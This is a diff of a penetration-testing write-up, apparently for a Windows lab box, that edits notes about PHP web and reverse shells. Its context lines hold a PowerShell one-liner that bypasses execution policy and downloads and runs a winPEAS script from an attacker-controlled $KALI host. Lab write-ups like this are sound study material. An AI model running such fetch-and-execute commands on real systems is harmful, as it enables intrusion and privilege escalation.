@@ -154,7 +154,7 @@ I realized my reverse shell wasn't working as it is a Windows box. I uploaded a 
 
 ### PHP web shell #2
 
-This shell was better
+This shell was better as it gave me a reverse shell rather than just a web one.
 
 ```
 <?php
@@ -403,7 +403,7 @@ Invoke-AllChecks
 
 
 
-
+## Shell
 
 After a lot of time wasted I realized there was no where to write files to and this account was a dead end. Then tried to RDP in as wade since we had a potential password for him.
 
@@ -459,16 +459,6 @@ Invoke-AllChecks
 <pre><code>powershell -ep bypass
 <strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/Invoke-winPEAS.ps1') 
 </strong></code></pre>
-
-
-
-
-
-
-
-
-
-
 
 ## Privilege Escalation Option #1
 
